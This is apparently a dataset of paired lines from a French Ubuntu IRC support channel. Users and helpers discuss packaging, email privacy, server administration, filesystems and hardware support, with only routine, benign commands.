la doc de Lucas est à jour pour se faire la main en vitesse: https://www.debian.org/doc/manuals/packaging-tutorial/packaging-tutorial.en.pdf … pour aller au delà le plus simple est de bouquiner la debian-policy	oui, je pense que je n'ai pas vraiment pris le temps nécessaire non plus :)
si tu connais un moyen d'éviter ça, ça m'intéresse	en se sortant les doigts et en packageant proprement ses dependances
s/paquets/modules python/	c'est une question dredi ou serieuse ?
(just saying)	comment tu installes des paquets dans un virtualenv sur un serveur de prod, qui nécessitent de compiler quelque chose ?
D'acc merci.	oui, mais pour instalelr python-dev en local il faut installer l'integralité de ton implem python en local, python-dev, c'est juste une partie (les headers essentiellement) du cpython upstream de python.org, packagé en plusieurs paquets dans ubuntu
?	ce que tu décris c'est un virtualenv, c'est utile pour installer des paquets python localement, sauf que python-dev n'est pas un paquet python mais système
ce que tu décris c'est un virtualenv, c'est utile pour installer des paquets python localement, sauf que python-dev n'est pas un paquet python mais système	Et il n'y a pas moyen de le contourner ? :-\
Qui aurait une solution? merci d'avance.	c'est une limitation smtp de l'endroit d'où tu te connecte vraisemblablement
re bonjour tlmde	tlmde n'est toujours pas ici
les passwd : ni l'un ni l'autre !	un (petit) aperçu des distrib et de leurs affilations: http://www.linux-mag.com/s/i/articles/7721/gldt102-full.png
d'ailleurs , l'icone d'installation est celle d ' Ubuntu	mandriva, c'est basé sur du rpm (ubuntu sur .deb)
on voit bien a l' allure du bureau qu' on a affaire a une sous-disto Ubuntu	"APODIO is a GNU/GPL project, a part of the GNU/Linux Mandriva family" http://dulibre.net/chevalier/About-apodio-by-chevaliers-du-libre.htm
piti c'est marqué APODIO is a GNU/GPL project, a part of the GNU/Linux Mandriva family:	j'ai lu :)
comment ca c'est une distro basé ubuntu et ca se voit!	comment ça se voit ?
je vérifie (si c'est pas une blague)	non mais t'es clairement hors sujet là
meme pour su : c'est le meme topo	y'a pas de mot de passe sur les livecd ubuntu (depuis que je connais)
oui , mais je veux dire dans le terminal	c'est quoi la distro ?
xxxx represente le nom de la distro	un peut plus de details s'il te plait, sinon, on aura du mal a t'aiguiller
comment je peux faire , je connais pas ce gars !	pourquoi y'a xxxx dans ce que t'as écrit ?
non aidez-moi !	vas plutot demander au gars de la distrib, on peut rien faire
non . il est ecrit [sudo] Password for xxxx:	xxxx ?
En ligne de commande	/quit ou /part . http://weechat.org/doc/stable/ .
finissant par ubuntu, une adresse courriel ? o_O	C'était mon alias pour 'question', mais j'ai oublié le / ... ;-)
!q #ubuntu-fr clache 1s	(q [<channel>] <nick|hostmask>[,<nick|hostmask>] [<years>y] [<weeks>w] [<days>d] [<hours>h] [<minutes>m] [<seconds>s] [<-1> or empty means forever] <reason>) -- +q targets for duration <reason> is mandatory
Pourquoi est-il interdit d'avoir une adresse courriel finissant par ubuntu?	C'est un nom de domaine qui appartient à l'association. Tu ne peux te créer une adresse avec.
!q General-Nemo	(q [<channel>] <nick|hostmask>[,<nick|hostmask>] [<years>y] [<weeks>w] [<days>d] [<hours>h] [<minutes>m] [<seconds>s] [<-1> or empty means forever] <reason>) -- +q targets for duration <reason> is mandatory
et Tutanota	Non plus, on m'a conseillé ce service que je ne connaissais pas cet après-midi.
Vous parlez de mon lien?	c'est koi ce lien?
c'est koi ce lien?	Salon francophone officiel.
Salon francophone officiel.	ca discute de quoi las bas?
ca discute de quoi las bas?	Du support de tous les produits mozilla.
Du support de tous les produits mozilla.	rejoins le canal et vois qui est op las bas.^^
rejoins le canal et vois qui est op las bas.^^	Les gens +o à un instant t ne veut rien dire. C'est GeekShadow qui gère ce salon.
Les gens +o à un instant t ne veut rien dire. C'est GeekShadow qui gère ce salon.	tu es sur caliopen?
tu es sur caliopen?	Non, pourquoi?
C'est un peu le mono du .NET alors l'openjdk	pas du tout
Ce qui veut dire ?	OpenJDK est libre, oui
je donne un simple avis d'utilisateur	tu donnes uen recommandations sur le salon de support, c'est pas tout à fait la meme chose
je suis en Linux version 4.1 rc2 et je n'ai pas de soucis	tant mieux pour toi, donc je suppose que tu as exactement le meme materiel que Flo_K, que tu utilises les memes logiciels de la meme facon et que tu as du temps de dispo pour l'assister si quelque chose se passe mal de son coté ? c'est ca ? :)
et j'ai cru voir que le 4.x permettait de ne plus devoir reboot à chq màj système	c'est un peut plus compliqué que ca
pas nécessairement, mais si certaines prises en charge matérielles sont optimisées pourquoi pas	SI tu testes, fais-le sur une installation annexe.
ou c'est mieux d'attendre que ce soit dispo sur les repo d'ubuntu?	y a la fonctionnalité pour que ce soit possible, ca veut pas dire que c'est automatisé
quelqu'un sait si c'est utile d'installer le linux-generic 4.x ?	As-tu besoin d'une des nouvelles fonctions?
c'est juste un outil, mais j'estime qu'il faut proposer un moyen de faire les choses correctement avant de se permettre de dire que tous les autres font nawak avec	Oui, ça risque d'être payant car ce sera une solution complète. Mais j'aurais peut-être les moyens d'investir quand les services le proposeront.
Oui, ça risque d'être payant car ce sera une solution complète. Mais j'aurais peut-être les moyens d'investir quand les services le proposeront.	la solution logicielle sera libre, mais apres, chacun est libre de le deplyer sur un server et de proposer des comptes caliopen contre un abonnement … encore une fois, un server de mail ca coute de l'hebergement et c'est penible à gerer, donc je ne serais pas choqué qu'il y ait peu d'offre gratuite
la solution logicielle sera libre, mais apres, chacun est libre de le deplyer sur un server et de proposer des comptes caliopen contre un abonnement … encore une fois, un server de mail ca coute de l'hebergement et c'est penible à gerer, donc je ne serais pas choqué qu'il y ait peu d'offre gratuite	On est complètement d'accord. :-)
même si ton fournisseur, et le fournisseur de A sont dignes de confiance selon toi	y a pas de solution magique pour la confiance, mais à un moment donné, il faut bien commencer quelque part, d'un point de vue technique, je ne peux que offrir la possibilité de faire les choses correctement, et c'est deja du taf … au delà c'est que de l'humain du social et de la volonté d'apprendre à faire les choses correctement
Par contre, je n'ai pas vu annoncé que http://ubuntu-fr.org était totalement en https maintenant.	je trouve l'approche de caliopen interessante, mais le modele envisagé ne sera pas focement gratuit
ou il t'arrive d'envoyer des mails vers une boite gérée sur GMail ?	c'est un autre probleme ca
si ca se trouve ce sont des gens tres bien, hein, mais juste dire "on est des gentils" ca ne me suffit pas pour leur faire confiance pour gerer ma correspondance privée	et tu t'assures que tous les gens avec qui tu corresponds aient les mêmes critères que toi ?
ils promettent de chiffrer leur stockage, c'est pourquoi il faut passer par le webmail	certes, mais chiffrer le stockage comment? avec une clé à eux ou à toi ?
gnome-shell 3.14	je ne l'utilise pas, désolé, ca eut été gnome-screensaver-command sous gnome pendant un temps, je ne sais pas si c'est toujours d'actualité
dans son offre gratuite également	meme sur les mails stockés sur leurs servers ? avec une clé que tu leur fournis ?
pour ce prix là je trouve ca raisonnable, et gandi me donne beaucoup plus confiance que 4 "freedom fighters" auto déclarés, ils sont peut etre tres bien, hein, c'est juste que je prefere rester circonspect, et que que j'estime que mes doutes valent plus que 6€, mais c'est mon avis perso	Je vais dans ton sens. Par exemple, je suis très surpris que si peu de libristes actifs ne soient pas chez un fai associatif.
Je vais dans ton sens. Par exemple, je suis très surpris que si peu de libristes actifs ne soient pas chez un fai associatif.	question de possibilité (on est pas tous à Paris, ou en centre ville de grosses agglo), et de besoins de débit (la fibre est une sirène qui fait avaler quelques couleuvres)
question de possibilité (on est pas tous à Paris, ou en centre ville de grosses agglo), et de besoins de débit (la fibre est une sirène qui fait avaler quelques couleuvres)	Par contre, il y a des services de mails qui gèrent de chiffrer en gratuit ou je rêve? :-)
Par contre, il y a des services de mails qui gèrent de chiffrer en gratuit ou je rêve? :-)	pas à ma connaissance, mais je me renseigne peu sur le sujet, vu que je gere moi meme mes mails
y a-t-il une ligne de commande pour savoir si l'écran est verrouillé ?	ca depend de ton environnement de bureau et du logiciel de blocage d'ecran que tu utilises
(et si tu avais fait attention sur -ops courant avtril, tu aurais pu en avoir gratos … just saying)	Oui, j'avais vu les propositions de ndd.
Ah ok, déjà, c'était utilisation de logiciels libres qui m'attirait.	typiquement, si je ne gerais pas moi meme mes mails, je prendrais probablement un NDD chez gandi, y a le .work à 5.83 TTC/an, y en a peut etre meme des moins chers, tu te retrouves avec un nom de domaine à toi, et 5 adresses e-mails avec 1GB de stockage chacune gratos sur les servers de gandi … et pour les connaitre un peu, tu peux etre sur que ce sont des logiciels libres qui tournent
typiquement, si je ne gerais pas moi meme mes mails, je prendrais probablement un NDD chez gandi, y a le .work à 5.83 TTC/an, y en a peut etre meme des moins chers, tu te retrouves avec un nom de domaine à toi, et 5 adresses e-mails avec 1GB de stockage chacune gratos sur les servers de gandi … et pour les connaitre un peu, tu peux etre sur que ce sont des logiciels libres qui tournent	Je sais qui sont à la base de Gandi. Je les ai invité à l'Ubuntu Party. ;-)
protection contractuelle, ca donne pas envie	En choisissant un service peu connu, j'évite certaines déconvenues comme les gars qui s'amusent avec hotmail ou autre.
En choisissant un service peu connu, j'évite certaines déconvenues comme les gars qui s'amusent avec hotmail ou autre.	après chacun fait comme il peut en fonction de son ration budget/paranoia/capacité à avaler des couleuvre/cynisme … je cherchais juste à ce que ce soit un choix "informé"
le bon service mail, c'est celui que tu geres toi meme … et encore … parce que les OpenMailBox et Tutanota, à part une profession de foi, en quoi diffèrent ils de gmail au niveau tech ? je vois pas d'endtroit où leur fournir une clé public générée par mes soins pour chiffrer tout ce qu'un user envoi, l'admin a toujours accès au contenu des mails des users … donc pour des services sans	Je sais mais je ne peux pas m'auto-héberger. Et n'ai pas une thune à mettre dans un serveur.
Je sais mais je ne peux pas m'auto-héberger. Et n'ai pas une thune à mettre dans un serveur.	certes, mais comme c'est posté sur le salon de support, je ne voulais pas qu'un lecteur occasionnel puisse penser que c'etait des services securisés, car les pages des sites concernés le pretende et que calinou ou toi ne le mentionnait pas
comme Tutanota	Merci de tes réponses. :-)
certes, c'est à but lucratif, mais c'est bien mieux fini	Et https://www.openmailbox.org/ tombe de temps en temps ou pas?
il était pas content que je pose des questions…	Ah oui, mauvais délire.
il ment toutes les 5 minutes	J'avais vu que tu étais actif sur le forum ;-) . Le service que j'utilisais pour mon mail personnel ferme, j'y étais depuis 15ans...
ça existe déjà pour Outlook je crois	En plus, je préfère les services francophones pour les cas de problèmes.
certes, tu ne peux y accéder que via un webmail, mais le service a l'air bien meilleur. Le stockage gratuit est de 1 Go, pareil que sous OpenMailBox	Je préfère avoir la possibilité thunderbird et webmail. La taille du stockage m'importe peu.
tu devrais essayer wicd pour la connexion, c'est un soft "au poil"!	 j'aimerai que ça marche sans rien installer de plus, ubuntu est sensé être fonctionnel
très bien alors je vais me rendre sur un salon débian si il en existe un, merci messieurs	le meta paquet "mail-stack-delivery" configure un dovecot+postfix avec une conf "raisonnable"
vu que je vais du debian, je me suis dit, que ça aurait peut-être du sens	 #postfix ?
ah c'est quoi le lieu ?	de maniere generale les questions de support sur des logiciels "services" se font sur des salons dédiés, pas sur le support des distros
bon beh essayons sur le salon des anglais, on va voir si j'ai plus de chance	si si, plein de monde, mais c'est pas vraiment le lieu pour poser ce genre de question, enfin ca se tente, mais faut pas esperer de reponse rapide
<HackphiL_> hello help svp... comment installer : linberry1.1b1a_i386deb.tar.gz <-- c'est quoi ça ?	comment ça fonctionne le paste stp?
?	utilise le paste si plus de 3 lignes
j'en sais rien peut etre qu'il faut lui donner des droits via chmod	---> http://www.progweb.com/modules/blackberry/index-fr.html#btools
il faut la chercher sur google	j'ai trouvé mais ./buildgen.sh me répond : not found sur toutes les lignes :-(
ben oui apparement le driver n'est pas installé.	comment je fais pour l'installer ce driver?
oui tu verras mais ca depends ce qu'il y a dedans si c'est un xxx.deb assure toi que c'est pour ubuntu au moins	j'ai récupéré l'archive en question avec ce lien ---> http://en.kioskea.net/download/download-22804-linberry-for-ubuntu
comment le savoir si c'est pour ubuntu?	là ou' tu l'a telecharger ils doivent bien marquer pour quelle version ils l'ont mis.
dans un repertoire que tu aura creer.	je viens de la décompresser dans /Telechargement, c'est bon?
?	bah... disons que je merdouille un peu pour faire reconnaitre mon blackberry q10 par ubuntu que je viens d'installer
je connais ni l'un ni l'autre mais je présume	il y a linberry
Et oh !	Pose ta question en nous donnant un maximum de précision. #ubuntu-fr est un salon de support, nous restons silencieux si il n'y a pas de question de posée. Pour discuter, nous utilisons #ubuntu-fr-offtopic. Et sinon, une consultation de http://www.gnurou.org/writing/smartquestionsfr est universellement utile.
Pose ta question en nous donnant un maximum de précision. #ubuntu-fr est un salon de support, nous restons silencieux si il n'y a pas de question de posée. Pour discuter, nous utilisons #ubuntu-fr-offtopic. Et sinon, une consultation de http://www.gnurou.org/writing/smartquestionsfr est universellement utile.	bonsoir. Je ne faisais que tester, car en fait je n'arrive pas en ce moment à me connecter au chan de la modération, #ubuntu-fr-moderation. Ne vous inquiétez pas pour moi. Bonsoir
ça dépend de ce que sont ces partitions	du coup je ne sais pas trop si je dois dire oui ou non.
qu'est-ce qui te pose problème ?	dois-je choisir "installer les màj pdt l'install" ?
si tu parlais de ça	je suis juste perturbé par l'install graphique
je suis juste perturbé par l'install graphique	j'installe avec debootstrap :D
je connais... je voulais dire sur les serveurs d'ubuntu	apt-cache search barry
apt-cache search barry	je suis en train d'installer xubuntu
toujours	sais-tu s'il existe un module ubnt permettant de gérer un blackberry Z10?
je réponds à ce que je peux, quand j'ai le temps et les connaissances pour, surtout :)	l'alternative-download est en français?
l'alternative-download est en français?	aucune idée
il me dit pandoc pdflatex not found. pdflatex is needed for pdf output	install tex-common
re Kl3mZ ... existe-t-il une version netinst pour ubuntu 32bits ?	http://www.ubuntu.com/download/alternative-downloads
lorsque je tappe la commande pandoc -o premier.pas.irc.pdf -s premier.pas.irc.md	suffit d'installer le paquet qui te fournira pdflatex dans ce cas
quelqu'un saurait m'expliquer la methode ?	pandoc
Je me tâte à reprendre un autre serveur.	je vais grailler... @+ très vite ! merci!
ça marche aussi =)	comment savoir si je prends 32 ou 64 bits?
Salutation	quelle version d'ubuntu me conseilles-tu pour une vieille machine (9-10ans)? je voudrais installer une version assez légère mais aussi pouvoir gérer mon Blackberry Z10
tout à l'heure, vous m'avez parlé d'acl, c'est quoi ?	Dazax t'a donné un lien
pour samba aussi	oui, c'était juste un exemple, il y en a beaucoup ^^
je ne connais pas les "acl"	par exemple, sur un serveur web, par défaut, apache utilise l'utilisateur www-data
ouais je me demandais à quoi servait le "other" dans les chmods. Je veux dire, cela fait référence à quel type d'utilisateur. Y aurait-il un example pratique pour savoir qui sont les "others"	u = owner du fichier
réveillé	ouais, ici
.dmrc semble attendre une syntaxe bizarre moi c'est juste du bash que je veux lui encoyer... Ptet .profile, mais je suis sur d'en avoir entendu parler d'un plus spécifique à l'interface graphique.	Il me sert pour remonter dans l'historique via le début d'une commande.
Je ne me souviens plus du nom du fichier équivalent au .bashrc mais pour le lancement lors du lancement de l'interface graphique...	Sans savoir, mais j'ai un .inputrc .
mezen et Mindiell: Si vous le faites sur ##ubuntu-fr-livres , j'en profiterai aussi. Car ici, c'est à éviter.	je m'y connecte au cas où mezen répondrait ;o)
Bonsoir !	.dmrc ?
mv ne marche pas...	avec une boucle for
re, saturne -> ? , quand tu branches ton imprimante, avec un tailf /var/log/kern.log en // ça donne quoi ?	euhhh
je suis passé en ubuntu 14.10 pour voir, toujours le meme message; impossible pour moi de rajouter la moindre imprimante :(	je t'invite à donner les references de ton imprimante
Quel navigateur léger pourriez vous me conseiller?	eLinks ^^
en haut de mon Makefile et ça semble avoir résolu le problème	Makefile n'exécute pas du bash, mais du Makefile :D
ça fait un "rm test.txt test.mp3"	C'est en effet ce que je veux faire (oui j'ai pas été très clair)... Mais je crois avoir trouvé en partie d'où vient le problème : je l'ai testé sous emacs (avec le mode majeur shell) qui simule une console bash
J'ai essayé de faire rm test.{txt,mp3} mais seul les fichiers .mp3 sont supprimés, rien ne se passe pour les mp3	pas compris ce que tu veux faire, mais la commande que tu as donné fonctionne sous bash
parfois ma connexion ne se fait pas automatiquement sur ubuntu 15.04 au démarrage , quelqu'un sait pourquoi ?	Connexion ou compte ou à internet?
donc faut que je trouve comment changer l'IP fixe de mon PI....	Ouïouïouïouïou!
Bonjour	jolie, jolie :)
ben d'apres eux c redibitoire	J'pensais ça
:)	Marci :)
merci	:)
Bonsoir Alex	ok....
ok....	veux-tu que je consulte le canal anglais?
le eth0 est en ip fixe	J'avais compris.
cette option il faut la passer comment à make ?	trop chinois pour moi, aussi débutant.  Désolé.
mais j'arrive pas à avoir en même temps wlan0 et eth0.....	qu'entends-tu par "en même temps"?
qu'entends-tu par "en même temps"?	me connecter au pi via eth0 et surfer sur le net via wlan simultanément
me connecter au pi via eth0 et surfer sur le net via wlan simultanément	Tout ce que je sais, c'est que ça se fait.  Désolé.
une petite question de débutant :)	vas
je voulais simplement merci beaver , ça marche ! :)	beaver: McPeter: J'ai vu de quoi il s'agit.  Je saurai me débrouiller grâce à votre aide.  Merci de participer à notre communauté :D
et c'ets accessible via navigateur	comment?
ça marche très bien avec airdroid	airdroid?
sur ta propre puce	J'ai tout désactivé
pas grave beaver	beaver: Je n'y connais rien - les texto, c'est des SMS?
(d'apres la notation pas terrible)	;D
beaver tu nous confonds, moi c'est Maximus :)	bein donc il suffirait de lancer maximus tout simplement, et lancer ton application
je regarde le man	je n'ai pas compris
et comment utiliser Maximus ?	tu lances la commande maximus, et tu lances une application
tu veux pouvoir envoyer un texto depuis ta ubuntu en somme non ?	Oui
J'ai l impression qu'à chaque nouvelle version d'ubuntu faut croiser les doigts pour des apps/tweaks fonctionnent. Alors que clairement si je reinstall une version plus old school d ubuntu et que je copie/colle dans la nouvelle ca fonctionnera.	faut simplement attendre que les logiciels dont tu as tant besoin se mettent à jour
Kalexyco : j utilise Gnome desktop, et j utilisais des "themes/Icons" pour 14.04 / 14.10 qui s installaient depuis le terminal (Nooblabs). Ca ne passe plus en 15.04 / 15.10.  A la limite theme / icon je m en fou mais en fait,  toute app qui n'est plus estampillé 14. est banni sur 15. d office.  Genre variety que j aime bien aussi  (wallpapper).  N'est plus installable.	il y a sans doute une raisons
je suis obligé d'apprendre à l'arrache avec le peu que je sais	pas cool
<3	une commande à l'arrache comme ça sans que je comprenne la logique du bordel, je vais pas comprendre
je vous demande un moment je suis au tel avec speedy	bref, tu dois recréer l'utilisateur proprement
ouais, beh quand je crée un user il n'est pas censé avoir un dossier /home/user ?	là en théorie la connexion fonctionne si tu mets /var/www/html pour la règle DefaultRoot
pourtant quand on crée un utilisateur, il n'est pas censé avoir un dossier perso ?	t'as créé un utilisateur culturacraft dont le home est /var/www/html alors qu'il devrait être /home/cultacraft comme je te l'ai dit au dessus
c'est déjà plus clair	non puisqu'on te demande de le préciser avec --home
ensuite à quoi sert le "--home=/var/www/html" dans la commande : ftpasswd --passwd --name=culturacraft --uid=5002 --gid=5002 --home=/var/www/html --shell=/bin/false	après tu dois jouer avec la notion de groupes pour pouvoir autoriser ou non tel membre à avoir accès à tel répertoire
ls: cannot access /var/mysql: No such file or directory	ls -l /var/lib/mysql
Pour ubuntu la derniere verions de php serait la 5.3.10	?
et tu fait un show databases !	y'a plus "simple"
ok ça marche je suis en train de chercher le nom de ma base	tu te connecte en root a la console mysql
LIRE	je suis un boulet c'est dingue je ne trouve pas le nom de la base.....ce soir je vais avoir de la lecture je crois....
pas plus que de monter un second server et de transférer de l'un vers l'autre	 donc je lance cette commande : pgdump / mysqldump
quel rapport ?	je ne pouvais pas monter une nouvelle installation sans un autre server. Je n'avais aucun moyen pour faire tout ça. Là j'ai maintenant de quoi faire une backup et de monter un nouveau server en parallèle.
et même si ubuntu a pour origine debian .. à l'heure d'aujourd'hui il y'a trop de différences entre les deux systèmes	 je viens de me rendre compte que j'étais déjà loggé ailleur donc désolé pour le doublons....
apache2: unrecognized service	déjà faudrait que t'arrêtes de crossposter :`\
Vous savez comment supprimer uniquement un paquet qui fait partie d'un meta-paquet ?	c'est vital de supprimer ce paquet ?
8.15 ça existe pas non plus	grilled
mais merci	la commande id
j'aimerai savoir comment on peut connaître l'uid et le gid d'un utilisateur pour paramêtrer un compte proftpd svp	sinon tu tapes : id nom_user
http://unix.stackexchange.com/questions/12597/missing-init-d-apache2-file	malheureusement, ça me dit que ça supprimer tout le metapackage
bonjour	avec le nom du paquet, ça ne suffit pas ?
/etc/init.d/mysql est obsolète	c'est sur 10.04
tu as accés direct au serveur?	oui ?
non pas isagri	si tu veux faire toi même, et que tu as du temps devant toi, mon conseil est de ne pas te preoccuper de relancer le site, mais de lire des docs/tutos pour apprendre à monter un server toi même, de nos jours c'est facile de se former sur des VMs sur son ordi
ne pas monter ton propre dns (ça sert à rien en soit)	je ne suis dessus que depuis une semaine.....
il y a de la doc sur aptitude ?	a priori, c'est pas mechant, mais y a pas mal de competances prequises pour fixer ce genre de probleme, mais a priori ca necessite 1/2 journée ou 2 de taf (sans compter l'acquisition des competances)
je paris que ce'st un vieux serveur avec une ubuntu desktop chez ovh ?	euh exact......comment tu le sais ?
?	donc c'est la RH de ta boite qui n'a pas su gerer la passation de charge de l'admin du site … suffit de prendre une presta
donc c'est la RH de ta boite qui n'a pas su gerer la passation de charge de l'admin du site … suffit de prendre une presta	 c'est ce que j'essaye de lui faire comprendre
je pige pas un truc	je débutes totalement
si tu fais une sauvegarde et que tu puisses retablir ensuite; tu peux envisager plusieurs senarios alexises	j'ai justement un question sur la "backup"
Je dirais 5Go, c'est un site marchant type le bon coin mais pour un domaine spécifique	je vais bientot aller me coucher, donc je ne vais pas me lancer maintenant dans ce genre de choses
pour chercher du support payant ou de l'infogerance, ce n'est pas le bon endroit, ici c'est pour de l'entreaide benevole	 je comprends mais existe une possibilité de rétablir le fonctionne du server et par la suite je fais une backup pour tout remonter avec une version plus récente ?
 je comprends mais existe une possibilité de rétablir le fonctionne du server et par la suite je fais une backup pour tout remonter avec une version plus récente ?	sans un volume important de detail je ne peux pas en dire plus, ni estimer la quantité de travail necessaire
sans un volume important de detail je ne peux pas en dire plus, ni estimer la quantité de travail necessaire	sachant que ce n'est plus supporté
mais sinon, il faut verifier les chemins … mais bon webmin ca reste tres fortement deconseillé	il y a t'il une personne ou une société susceptible de m'aider ? C'est vital ce server je suis prêt à payer pour résoudre tout mes soucis
il y a t'il une personne ou une société susceptible de m'aider ? C'est vital ce server je suis prêt à payer pour résoudre tout mes soucis	personne de serieux te proposera de laisser ca en 10.04, plus de support signifie plus de mise à jour de securité, ce qui est inacceptable pour un server, par ailleurs webmin pose des problemes de secu, c'est pourquoi il a été retiré des depots
personne de serieux te proposera de laisser ca en 10.04, plus de support signifie plus de mise à jour de securité, ce qui est inacceptable pour un server, par ailleurs webmin pose des problemes de secu, c'est pourquoi il a été retiré des depots	puis je vous détailler mon souci ?
un passage en 10.04 ?  la 10.04 n'est plus supportée	j'ai tout vérifié
Et c'est pas prévu que linux jette ext4 pour tout migrer en natif brtfs ?	http://askubuntu.com/questions/425784/which-is-better-for-a-home-media-server-zfs-or-btrfs-or-lvm-md
Et on ne perd pas en efficacité ?	à quel niveau ?
Je ne sais pas du tout comment LVM gère ses partitions, (car des partitions de taille adaptables pour moi c'est assez bleuffant)	LVM définit des partitions logiques
il n'y a pas grand chose qu'un système de fichiers puisse y faire si tu n'en as qu'un seul	Quand certains secteurs sont touchés en ext4 on perds seulement le fichier dessus non ? Alors que j'ai peur qu'en LVM je perde toute la partition
Quand certains secteurs sont touchés en ext4 on perds seulement le fichier dessus non ? Alors que j'ai peur qu'en LVM je perde toute la partition	ridicule
ext4 est moins sensible à ces défaillances non ?	non, pas plus
Mais du coup pourquoi est-ce qu'il existe à la fois LVM et btrfs si les deux font la même chose ?	parce qu'avec brtfs (et zfs), les systèmes de fichiers ne pouvaient avoir certaines fonctionnalités qu'à travers LVM
Car j'ai cru comprendre que si le disque prenait un pet il était fort possible de perdre toute la partition	parce que tu crois que brtfs est mieux loti ?
LVM pour les sauvegarde c'est pas la mort aussi ?	pourquoi le serait-ce ?
Pourquoi pas pour la sauvegarde ? Les snapshots ne peuvent pas être intéressants ?	les snapshots existent aussi avec LVM
bonsoir	bonsoir !
oui je connai les doc ubuntu merci j'aimerai un autre logiciel que ceux proposer	Alors je ne sais pas, je n'en rippe pas.
coucou je viens d'installer ubuntu j'aimerai connaitre un logiciel pour copier un dvd a partir du lecteur	https://doc.ubuntu-fr.org/ripper_un_dvd .
HikiBE: Je te conseille de parcourir http://guide.ubuntu-fr.org/ et de lire les livres libres http://ubuntu-manual.org/ et http://framabook.org/2-simple-comme-ubuntu . C'est basé sur Unity.	il est parti ^^
il est parti ^^	Merci. Ma connexion est lente. ;-)
ok, donc mieux vaut garder la version avec unity?	Les connaisseurs de Kubuntu se font rares quand même.
merci, et concernant le chooix de l'interface, je trouverais aussi facilement de l'aide si je prend Kubuntu, Lubuntu où Xubuntu? la doc est pareil et les aides du tchat compatible? ^	Sinon, c'est la 14.04.2dont les mises à niveau se font tous les 2 ans http://doc.ubuntu-fr.org/versions . Je te conseille la 64bits si ton processeur l'est aussi(choix amd64). Si tu as un uefi, c'est même obligé, voir http://doc.ubuntu-fr.org/uefi .
Sinon, c'est la 14.04.2dont les mises à niveau se font tous les 2 ans http://doc.ubuntu-fr.org/versions . Je te conseille la 64bits si ton processeur l'est aussi(choix amd64). Si tu as un uefi, c'est même obligé, voir http://doc.ubuntu-fr.org/uefi .	merci, je vazis prendre une lts en 64bits
merci, je vazis prendre une lts en 64bits	Les aides sont compatibles pour l'essentiel, mais pas tout.
Bonjour, je viens pour prendre une info, je suis total néophyte de linux et je voudrais savoir quel version d'Ubuntu prendre pour commencer (J'ai un ordinateur récent et j'ai u la doc.) la LTS où la normale? Concernant la version, les aides wiki et tchat sont elles valables aussi si je prend Kubuntu où Lubuntu? Merci.	Si tu acceptes de faire les mises à niveau tous les 6 mois et avoir des versions récentes des logiciels, prends la normale.
quand je double clic sur le fichier sh, j'ai 6 options possibles, mais je ne vois pas comment installer le binz, arh ça m'énerve	A vérifier "./script.sh" dans un terminal.
ok merci	J'ai https://doc.ubuntu-fr.org/television#diffusion_de_flux_de_l_ordinateur_vers_la_television . \o/
J'ai https://doc.ubuntu-fr.org/television#diffusion_de_flux_de_l_ordinateur_vers_la_television . \o/	ah merci je regarde ça
ah merci je regarde ça	J'imagine qu'il faut mettre la freebox en mode routeur et autres joyeusetés auxquelles je ne me suis jamais intéressé.
J'imagine qu'il faut mettre la freebox en mode routeur et autres joyeusetés auxquelles je ne me suis jamais intéressé.	on dirai que la freebox revolution n'est plus gérée, dans homeplayer ou freeplayer ils disent que la revolution n'est pas géré. exemple : Un abonnement chez le FAI FREE avec une Freebox ( V2, V3, V4, V5 ou HD )
on dirai que la freebox revolution n'est plus gérée, dans homeplayer ou freeplayer ils disent que la revolution n'est pas géré. exemple : Un abonnement chez le FAI FREE avec une Freebox ( V2, V3, V4, V5 ou HD )	https://doc.ubuntu-fr.org/freebox et http://genma.free.fr/?-Freebox-et-Free-le-F-A-I- , un gars sympa. :-)
https://doc.ubuntu-fr.org/freebox et http://genma.free.fr/?-Freebox-et-Free-le-F-A-I- , un gars sympa. :-)	 Oleti Sous linux et mac, un script HomePlayer.sh est founit. Celui-ci permet de
y a un navigateur web dans la V6	il faut que j'essaie ça alors
le freeplayer ne va pas le faire avec un flux web	ah oui c'est vrai je me souviens
d'accord je la refais : Es-ce possible de regarder un flux vidéo d'un PC sous Ubuntu sur une TV connectée à une freebox ?	Connais-tu https://doc.ubuntu-fr.org/dlna ?
Connais-tu https://doc.ubuntu-fr.org/dlna ?	Oleti que c'est compliqué on dirai qu'il faut installer Mono sur Linux, et ça a l'air chiant de fair emarher le tout  : http://www.mono-project.com/archived/guiderunning_mono_applications/
Non pardon, sur la TV réliée à la freebox. (Je parle sous Ubuntu bien sûr)	Ca me semble jouable facilement,mais je ne m'y connais pas.
Ca me semble jouable facilement,mais je ne m'y connais pas.	 ah non c'est bon ! il semble que free mette à dispoition un freeplayer depuis la revolution, cela devrai marcher
Lire sur sa télé un flux/fichier présent sur son pc.	 merci mais je ne vois pas de "regarder votre flux vidéo PC sur votre freebox revolution" dans cette page : https://doc.ubuntu-fr.org/freeboxv6
:-)	oulah, je ne sais pas comment faire ça, alors on dirai qu'il n'y a pas d'outil simple
Bonjour. Es-ce possible de regarder un flux vidéo de son PC sur ta freebox ?	 c'est quoi comme flux video ?
 c'est quoi comme flux video ?	c'est une vidéo en live, sur dailymoion
:-)	non je ne connais pas, mais je reconnais certains programmes, comme VLC. Le problème c'est qu'il faudrait réussir à connecter la TV à mon PC, mais es ce que ça peut se faire via le CPL ?
je vais googler	C'est un gestionnaire de fenêtre. On peut même l'utiliser seul sans lxde. Ca fait un système très léger et super réactif.
C'est un gestionnaire de fenêtre. On peut même l'utiliser seul sans lxde. Ca fait un système très léger et super réactif.	mince, je croyais qu'openbox c'était la commande correspondante à mon besoin :p
mince, je croyais qu'openbox c'était la commande correspondante à mon besoin :p	https://doc.ubuntu-fr.org/compiz_fusion .
https://doc.ubuntu-fr.org/compiz_fusion .	ce doit être ça, je suis en installation par défaut :)
ce doit être ça, je suis en installation par défaut :)	Le lien n'était pas vraiment juste. Regarde https://doc.ubuntu-fr.org/unity#configuration avant.
Le lien n'était pas vraiment juste. Regarde https://doc.ubuntu-fr.org/unity#configuration avant.	c'est bien ça
openbox tu dis	Toi, c'est compiz que tu dois avoir comme gestionnaire de fenêtre.
je pense bien qu'il doit y avoir un paramètre également, maintenant reste à savoir lequel :)	C'est une sous-couche graphique de lubuntu.
à priori ça devrait fonctionner car sur d'autre install ça le fait	Ouais, je me dis qu'openbox a des réglages pour ça. Mais je ne sais pas comment ça se fait avec unity/nautilus.
je suis obligé d'aller dans nautilus	C'est sur unity? J'utilise lubuntu...
je ne comprends pas pourquoi dnsmasq est plus lent que mon serveur dns ?	Il va falloir être patient car on est un dimanche matin très tôt. :-/
